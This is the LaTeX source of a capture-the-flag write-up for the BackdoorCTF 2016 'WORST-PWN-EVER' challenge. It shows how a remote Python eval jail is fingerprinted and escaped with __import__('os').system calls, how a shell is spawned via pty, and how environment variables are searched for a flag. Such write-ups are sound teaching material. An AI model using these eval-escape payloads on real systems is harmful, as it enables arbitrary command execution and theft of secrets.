\documentclass{article}


\usepackage{framed}
\usepackage{fancybox}
\usepackage[english]{babel}


\begin{document}

    \noindent { \Huge \texttt{WORST-PWN-EVER} }

    \vspace{1\baselineskip plus 1\parskip}

    \noindent competition: \texttt{BackdoorCTF 2016}
    \newline class: pwn
    \newline points: 100

    \vspace{1\baselineskip plus 1\parskip}

    \ovalbox{ \begin{minipage}{.95\textwidth}
        \vspace{1ex}
        \noindent tocttou is an enviornmentalist. But some say he has
        a~vicious motive and he uses nature to hide his dark side. We
        found a~weird shell on his amazon (pun inteded) web services.
        Can you tell us what is he upto?
        \newline Tip: he might shut down the machine if he notices you
        ---~and he will (maybe in 45 seconds).
        \newline Access: nc hack.bckdr.in 9008
        \newline Created by: Ashish Chaudhary
        \vspace{1ex}
    \end{minipage} }

    \vspace{2\baselineskip plus 2\parskip}

    \ovalbox{ \begin{minipage}{.95\textwidth}
        \vspace{1ex}
        \begin{center} { \large tl;dr } \end{center}
        \hrule
        \vspace{1ex}
        We have been given an Python eval jail over a TCP socket.
        The solution is to retreive an environment variable using one
        of the classic builtin hacks, for example:
        \begin{verbatim}
__import__('os').system('env|grep -iE ".*f.*l.*a.*g"')
        \end{verbatim}
    \end{minipage} }

    \vspace{1\baselineskip plus 1\parskip}


\section*{Task walkthrough}

    After establishing a~connection to the given server a~prompt
    is returned. Let's try some random fuzzing...
    First let's see what happens when we press \texttt{CTRL+D}
    right away:
\begin{verbatim}
> EOFError: EOF when reading a line
--> WHAT ARE YOU DOING HERE? >-[
\end{verbatim}
    Let's check if it is a~system shell:
\begin{verbatim}
> echo x
SyntaxError: unexpected EOF while parsing (<string>, line 1)
--> WHAT ARE YOU DOING HERE? >-[
\end{verbatim}
    No, it's definitely not a~system shell. It looks like
    a~Python interpreter. Let's check this theory then:
\begin{verbatim}
> 1+1
\end{verbatim}
    No response, no error ---~it looks promising. Let's check
    then if we can see some Python errors:
\begin{verbatim}
> 1+'x'*[]
TypeError: can't multiply sequence by non-int of type 'list'
\end{verbatim}
    Bingo! If it really is an old \texttt{eval} jail, then
    we could escape using a~classic builtin hacks. Let's check
    that:
\begin{verbatim}
> str(__import__('os').system('echo x'))
x
\end{verbatim}
    Got it! Let's get a shell and start looking around:
\begin{verbatim}
> __import__('pty').spawn('/bin/sh')
sh-4.3#
\end{verbatim}

    After looking through available files for a~few minutes
    and finding nothing useful, we noticed the task description
    contains a~clue ---~the word \emph{environmentalist}
    suggests checking environment variables.

    \vspace{1\baselineskip plus 1\parskip}

    \begin{framed} \begin{minipage}{.85\textwidth}
        { \footnotesize \begin{verbatim}
sh-4.3# env
HOSTNAME=43523caef67d
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
_F_L_A_G_='xxxxxxxxxxxxxxx CENSORED xxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxxx'
PWD=/scripts
SHLVL=3
HOME=/root
_=/usr/bin/env
        \end{verbatim} }
    \end{minipage} \end{framed}

\end{document}
